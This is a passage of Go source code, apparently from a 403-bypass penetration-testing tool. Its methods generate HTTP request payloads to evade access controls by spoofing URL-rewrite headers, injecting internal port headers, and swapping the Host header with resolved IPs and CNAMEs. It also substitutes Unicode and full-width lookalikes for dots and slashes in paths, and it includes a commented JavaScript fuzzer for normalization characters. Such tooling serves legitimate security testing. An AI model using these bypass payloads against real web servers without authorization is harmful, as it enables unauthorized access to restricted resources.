		GB403Logger.Error().Msgf("Failed to read header URLs: %v", err)
		return allJobs
	}

	basePath := strings.TrimRight(parsedURL.Path, "/")
	if basePath == "" {
		basePath = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Create full path with query for RawURI
	fullPathWithQuery := parsedURL.Path
	if query != "" {
		fullPathWithQuery += query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	for _, headerURL := range headerURLs {
		// First variant: base_path in header (don't add query to header)
		job := baseJob
		job.RawURI = "/"
		job.Headers = []Headers{{
			Header: headerURL,
			Value:  basePath,
		}}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)

		// Optional: Add variant with query in header value
		if query != "" {
			job := baseJob
			job.RawURI = "/"
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  basePath + query,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}

		// Second variant: full target URL in header (targetURL already includes query)
		if strings.Contains(strings.ToLower(headerURL), "url") ||
			strings.Contains(strings.ToLower(headerURL), "request") ||
			strings.Contains(strings.ToLower(headerURL), "file") {
			job := baseJob
			job.RawURI = "/"
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  targetURL,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}

		// Parent paths variants
		parts := strings.Split(strings.Trim(basePath, "/"), "/")
		for i := len(parts) - 1; i >= 0; i-- {
			parentPath := "/" + strings.Join(parts[:i], "/")
			if parentPath == "/" {
				parentPath = "/"
			}

			// Parent path in header, without query in header but with query in RawURI
			job := baseJob
			job.RawURI = fullPathWithQuery
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  parentPath,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)

			// Optional: Parent path + query in header
			if query != "" {
				job := baseJob
				job.RawURI = fullPathWithQuery
				job.Headers = []Headers{{
					Header: headerURL,
					Value:  parentPath + query,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)
			}

			// Full URL with parent path in header
			if strings.Contains(strings.ToLower(headerURL), "url") ||
				strings.Contains(strings.ToLower(headerURL), "refer") {
				// Without query in header
				fullURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parentPath)
				job := baseJob
				job.RawURI = fullPathWithQuery
				job.Headers = []Headers{{
					Header: headerURL,
					Value:  fullURL,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)

				// With query in header
				if query != "" {
					fullURLWithQuery := fmt.Sprintf("%s://%s%s%s", parsedURL.Scheme, parsedURL.Host, parentPath, query)
					job := baseJob
					job.RawURI = fullPathWithQuery
					job.Headers = []Headers{{
						Header: headerURL,
						Value:  fullURLWithQuery,
					}}
					job.PayloadToken = GeneratePayloadToken(job)
					allJobs = append(allJobs, job)
				}
			}
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateHeaderPortPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerPorts, err := ReadPayloadsFromFile("header_ports.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read header ports: %v", err)
		return allJobs
	}

	internalPorts, err := ReadPayloadsFromFile("internal_ports.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read internal ports: %v", err)
		return allJobs
	}

	// Extract path and query
	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	for _, headerPort := range headerPorts {
		if headerPort == "" {
			continue
		}

		// Handle internal ports
		for _, port := range internalPorts {
			job := baseJob
			job.Headers = []Headers{{
				Header: headerPort,
				Value:  port,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

func (pg *PayloadGenerator) GenerateHostHeaderPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	// Extract path and query
	pathAndQuery := parsedURL.Path
	if parsedURL.Query != "" {
		pathAndQuery += "?" + parsedURL.Query
	}

	// Get IP information from cache
	probeCacheResult, err := pg.reconCache.Get(parsedURL.Hostname)
	if err != nil || probeCacheResult == nil {
		GB403Logger.Error().Msgf("No cache result found for %s: %v", targetURL, err)
		return allJobs
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		BypassModule: bypassModule,
	}

	// Process IPv4 Services
	for scheme, ips := range probeCacheResult.IPv4Services {
		for ip, ports := range ips {
			for _, port := range ports {
				// Construct IP host
				ipHost := ip
				if port != "80" && port != "443" {
					ipHost = fmt.Sprintf("%s:%s", ip, port)
				}

				// Variation 1: URL with IP, Host header with original host
				job1 := baseJob
				job1.Scheme = scheme
				job1.Host = ipHost
				job1.RawURI = pathAndQuery
				job1.Headers = []Headers{{
					Header: "Host",
					Value:  parsedURL.Host,
				}}
				job1.PayloadToken = GeneratePayloadToken(job1)
				allJobs = append(allJobs, job1)

				// Variation 2: Original URL, Host header with IP:port
				job2 := baseJob
				job2.Scheme = parsedURL.Scheme
				job2.Host = parsedURL.Host
				job2.RawURI = pathAndQuery
				job2.Headers = []Headers{{
					Header: "Host",
					Value:  ipHost,
				}}
				job2.PayloadToken = GeneratePayloadToken(job2)
				allJobs = append(allJobs, job2)
			}
		}
	}

	// Process IPv6 Services
	for scheme, ips := range probeCacheResult.IPv6Services {
		for ip, ports := range ips {
			for _, port := range ports {
				// Construct IPv6 host
				ipHost := fmt.Sprintf("[%s]", ip)
				if port != "80" && port != "443" {
					ipHost = fmt.Sprintf("[%s]:%s", ip, port)
				}

				// Variation 1: URL with IPv6, Host header with original host
				job1 := baseJob
				job1.Scheme = scheme
				job1.Host = ipHost
				job1.RawURI = pathAndQuery
				job1.Headers = []Headers{{
					Header: "Host",
					Value:  parsedURL.Host,
				}}
				job1.PayloadToken = GeneratePayloadToken(job1)
				allJobs = append(allJobs, job1)

				// Variation 2: Original URL, Host header with IPv6
				job2 := baseJob
				job2.Scheme = parsedURL.Scheme
				job2.Host = parsedURL.Host
				job2.RawURI = pathAndQuery
				job2.Headers = []Headers{{
					Header: "Host",
					Value:  ipHost,
				}}
				job2.PayloadToken = GeneratePayloadToken(job2)
				allJobs = append(allJobs, job2)
			}
		}
	}

	// Process CNAMEs - New section
	if len(probeCacheResult.CNAMEs) > 0 {
		//GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Found %d CNAMEs for %s", len(probeCacheResult.CNAMEs), parsedURL.Hostname)

		for _, rawCname := range probeCacheResult.CNAMEs {
			// Strip trailing dot that's common in DNS responses
			cname := strings.TrimSuffix(rawCname, ".")

			// Skip if CNAME is empty after trimming
			if cname == "" {
				continue
			}

			// 1. Original URL + CNAME in Host header
			job1 := baseJob
			job1.Scheme = parsedURL.Scheme
			job1.Host = parsedURL.Host
			job1.RawURI = pathAndQuery
			job1.Headers = []Headers{{
				Header: "Host",
				Value:  cname,
			}}
			job1.PayloadToken = GeneratePayloadToken(job1)
			allJobs = append(allJobs, job1)

			// 2. URL with CNAME + original host in Host header
			job2 := baseJob
			job2.Scheme = parsedURL.Scheme
			job2.Host = cname
			job2.RawURI = pathAndQuery
			job2.Headers = []Headers{{
				Header: "Host",
				Value:  parsedURL.Host,
			}}
			job2.PayloadToken = GeneratePayloadToken(job2)
			allJobs = append(allJobs, job2)

			// 3. URL with CNAME + CNAME in Host header too
			job3 := baseJob
			job3.Scheme = parsedURL.Scheme
			job3.Host = cname
			job3.RawURI = pathAndQuery
			job3.Headers = []Headers{{
				Header: "Host",
				Value:  cname,
			}}
			job3.PayloadToken = GeneratePayloadToken(job3)
			allJobs = append(allJobs, job3)

			// 4. Partial CNAME suffix tests - recursive domain parts
			domainParts := strings.Split(cname, ".")
			if len(domainParts) > 2 { // Only if we have subdomains
				for i := 1; i < len(domainParts)-1; i++ {
					// Build partial domain from current position to the end
					partialDomain := strings.Join(domainParts[i:], ".")

					job := baseJob
					job.Scheme = parsedURL.Scheme
					job.Host = parsedURL.Host
					job.RawURI = pathAndQuery
					job.Headers = []Headers{{
						Header: "Host",
						Value:  partialDomain,
					}}
					job.PayloadToken = GeneratePayloadToken(job)
					allJobs = append(allJobs, job)
				}
			}
		}
	}

	GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

/*
JS code used to fuzz unicode path chars

const charsToCheck = ["\\", "/", ".", ":", "%", "~", "*", "<", ">", "|", "@", "!", "#", "+", "{", "}", "[", "]", ";", ",", "'", "\""];
const normalizationForms = ["NFKC", "NFC", "NFD", "NFKD"];

const normalizedMatches = new Set();

// Loop through all code points (from 0x7f upwards)

	for (let i = 0x7f; i <= 0x10FFFF; i++) {
	    const char = String.fromCodePoint(i);

	    if (i > 0x7f) {
	        normalizationForms.forEach(form => {
	            const normalized = char.normalize(form);

	            for (let charToCheck of charsToCheck) {
	                if (charToCheck === normalized) {
	                    normalizedMatches.add(`${char}(${form})=${charToCheck}`);
	                }
	            }
	        });
	    }
	}

normalizedMatches.forEach(match => console.log(match));
*/
func (pg *PayloadGenerator) GenerateUnicodePathNormalizationsPayloads(targetURL string, bypassModule string) []BypassPayload {
	var jobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL: %v\n", err)
		return jobs
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Read Unicode mappings
	unicodeMappings, err := ReadPayloadsFromFile("unicode_path_chars.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read unicode path chars: %v\n", err)
		return jobs
	}

	// Build character mapping for '.' and '/'
	targetChars := map[rune]bool{'.': true, '/': true}
	charMap := make(map[rune][]string)

	for _, mapping := range unicodeMappings {
		parts := strings.Split(mapping, "=")
		if len(parts) != 2 {
			continue
		}
		asciiChar := []rune(parts[1])[0]
		if !targetChars[asciiChar] {
			continue
		}
		unicodeChar := strings.Split(parts[0], "(")[0]
		charMap[asciiChar] = append(charMap[asciiChar], unicodeChar)
	}

	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	uniquePaths := make(map[string]struct{})

	// Helper to add both Unicode and URL-encoded versions
	addPathVariants := func(path string) {
		// Append query to the modified path
		pathWithQuery := path + query

		if _, exists := uniquePaths[pathWithQuery]; !exists {
			uniquePaths[pathWithQuery] = struct{}{}
			job := baseJob
			job.RawURI = pathWithQuery
			job.PayloadToken = GeneratePayloadToken(job)
			jobs = append(jobs, job)
		}
	}

	// Find all positions of '.' and '/'
	type CharPosition struct {
		char     rune
		position int
	}
	var positions []CharPosition
	for i, char := range path {
		if targetChars[char] {
			positions = append(positions, CharPosition{char: char, position: i})
		}
	}

	// 1. Single character replacements
	for _, pos := range positions {
		unicodeChars := charMap[pos.char]
		for _, unicodeChar := range unicodeChars {
			// Create Unicode version
			pathRunes := []rune(path)
			pathRunes[pos.position] = []rune(unicodeChar)[0]
			unicodePath := string(pathRunes)
			addPathVariants(unicodePath)

			// Create URL-encoded version
			encodedChar := URLEncodeAll(unicodeChar)
			encodedPath := path[:pos.position] + encodedChar + path[pos.position+1:]
			addPathVariants(encodedPath)
		}
	}

	// 2. Replace all occurrences of each character
	for char := range targetChars {
		if unicodeChars, ok := charMap[char]; ok {
			for _, unicodeChar := range unicodeChars {
				// Replace all occurrences with Unicode
				var unicodePath strings.Builder
				var encodedPath strings.Builder
				lastPos := 0

				for i, c := range path {
					if c == char {
						unicodePath.WriteString(path[lastPos:i])
						unicodePath.WriteString(unicodeChar)

						encodedPath.WriteString(path[lastPos:i])
						encodedPath.WriteString(URLEncodeAll(unicodeChar))

						lastPos = i + 1
					}
				}
				unicodePath.WriteString(path[lastPos:])
				encodedPath.WriteString(path[lastPos:])

				addPathVariants(unicodePath.String())
				addPathVariants(encodedPath.String())
			}
		}
	}

	// 3. Special case: Add full-width slash before the last segment
	segments := strings.Split(path, "/")
	if len(segments) > 1 {
		lastSegment := segments[len(segments)-1]
		if lastSegment != "" {
			// Create a new path with the full-width slash before the last segment
			newSegments := make([]string, len(segments))
			copy(newSegments, segments)

			// Add the full-width slash before the last segment
			// U+FF0F (／) = %ef%bc%8f
			newSegments[len(newSegments)-1] = "%ef%bc%8f" + lastSegment

			// Join the path back together
			fullWidthSlashPath := strings.Join(newSegments, "/")
			addPathVariants(fullWidthSlashPath)

			// Also try with the raw Unicode character version
			newSegments[len(newSegments)-1] = "／" + lastSegment
			unicodeFullWidthPath := strings.Join(newSegments, "/")
			addPathVariants(unicodeFullWidthPath)
		}
	}

	// 4. Enhanced technique: Add full-width slash after each slash in the path
	if strings.Contains(path, "/") {
		// For each slash position, create variants with fullwidth slash added after it
		var lastPos int
		var enhancedPathEncoded, enhancedPathUnicode strings.Builder

		for i, char := range path {
			if char == '/' {
				// Add everything up to and including the slash
				enhancedPathEncoded.WriteString(path[lastPos : i+1])
				enhancedPathUnicode.WriteString(path[lastPos : i+1])

				// Add fullwidth slash after the regular slash
				enhancedPathEncoded.WriteString("%ef%bc%8f") // URL-encoded version
				enhancedPathUnicode.WriteString("／")         // Unicode version

				// Create and add the variant up to this point to catch all possible positions
				enhancedPathSoFarEncoded := enhancedPathEncoded.String() + path[i+1:]
				enhancedPathSoFarUnicode := enhancedPathUnicode.String() + path[i+1:]

				addPathVariants(enhancedPathSoFarEncoded)
				addPathVariants(enhancedPathSoFarUnicode)

				lastPos = i + 1
			}
		}

		// Include remainder of the path if we ended on a non-slash
		if lastPos < len(path) {
			enhancedPathEncoded.WriteString(path[lastPos:])
			enhancedPathUnicode.WriteString(path[lastPos:])
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).
		Msgf("Generated %d unicode normalization payloads for %s\n", len(jobs), targetURL)
	return jobs
}

// func (pg *PayloadGenerator) GenerateUnicodePathNormalizationsPayloads(targetURL string, bypassModule string) []BypassPayload {
// 	var jobs []BypassPayload

// 	// 1. Get midpaths payloads first
// 	midPathsPayloads := pg.GenerateMidPathsPayloads(targetURL, "mid_paths")

// 	// 2. Read Unicode mappings
// 	unicodeMappings, err := ReadPayloadsFromFile("unicode_path_chars.lst")
// 	if err != nil {
// 		GB403Logger.Error().Msgf("Failed to read unicode path chars: %v\n", err)
// 		return jobs
// 	}

// 	// 3. Build character mapping for '.' and '/'
// 	targetChars := map[rune]bool{'.': true, '/': true}
// 	charMap := make(map[rune][]string)

// 	for _, mapping := range unicodeMappings {
// 		parts := strings.Split(mapping, "=")
// 		if len(parts) != 2 {
// 			continue
// 		}
// 		asciiChar := []rune(parts[1])[0]
// 		if !targetChars[asciiChar] {
// 			continue
// 		}
// 		unicodeChar := strings.Split(parts[0], "(")[0]
// 		charMap[asciiChar] = append(charMap[asciiChar], unicodeChar)
// 	}

// 	// 4. Filter midpaths payloads to only those containing dots or slashes
// 	var filteredPayloads []BypassPayload
// 	for _, payload := range midPathsPayloads {
// 		if containsAny(payload.RawURI, []rune{'.', '/'}) {
// 			filteredPayloads = append(filteredPayloads, payload)
// 		}
// 	}

// 	// 5. Track unique paths to avoid duplicates
// 	uniquePaths := make(map[string]struct{})

// 	// 6. Process each filtered payload
// 	for _, origPayload := range filteredPayloads {
// 		path := origPayload.RawURI

// 		// Find all positions of '.' and '/'
// 		type CharPosition struct {
// 			char     rune
// 			position int
// 		}
// 		var positions []CharPosition
// 		for i, char := range path {
// 			if targetChars[char] {
// 				positions = append(positions, CharPosition{char: char, position: i})
// 			}
// 		}

// 		// Single character replacements
// 		for _, pos := range positions {
// 			unicodeChars := charMap[pos.char]
// 			for _, unicodeChar := range unicodeChars {
// 				// Create Unicode version
// 				pathRunes := []rune(path)
// 				pathRunes[pos.position] = []rune(unicodeChar)[0]
// 				unicodePath := string(pathRunes)

// 				if _, exists := uniquePaths[unicodePath]; !exists {
// 					uniquePaths[unicodePath] = struct{}{}

// 					// Create a new job based on the original payload
// 					job := BypassPayload{
// 						OriginalURL:  origPayload.OriginalURL,
// 						Method:       origPayload.Method,
// 						Scheme:       origPayload.Scheme,
// 						Host:         origPayload.Host,
// 						RawURI:       unicodePath,
// 						Headers:      origPayload.Headers,
// 						BypassModule: bypassModule,
// 					}
// 					job.PayloadToken = GeneratePayloadToken(job)
// 					jobs = append(jobs, job)
// 				}

// 				// Create URL-encoded version
// 				encodedChar := URLEncodeAll(unicodeChar)
// 				encodedPath := path[:pos.position] + encodedChar + path[pos.position+1:]

// 				if _, exists := uniquePaths[encodedPath]; !exists {
// 					uniquePaths[encodedPath] = struct{}{}

// 					// Create a new job based on the original payload
// 					job := BypassPayload{
// 						OriginalURL:  origPayload.OriginalURL,
// 						Method:       origPayload.Method,
// 						Scheme:       origPayload.Scheme,
// 						Host:         origPayload.Host,
// 						RawURI:       encodedPath,
// 						Headers:      origPayload.Headers,
// 						BypassModule: bypassModule,
// 					}
// 					job.PayloadToken = GeneratePayloadToken(job)
// 					jobs = append(jobs, job)
// 				}
// 			}
// 		}
// 	}

// 	GB403Logger.Debug().BypassModule(bypassModule).
// 		Msgf("Generated %d unicode normalization payloads for %s\n", len(jobs), targetURL)
// 	return jobs
// }

// // Helper function to check if a string contains any of the given runes
// func containsAny(s string, chars []rune) bool {
// 	for _, c := range s {
// 		for _, t := range chars {
// 			if c == t {
// 				return true
// 			}
// 		}
// 	}
// 	return false
// }
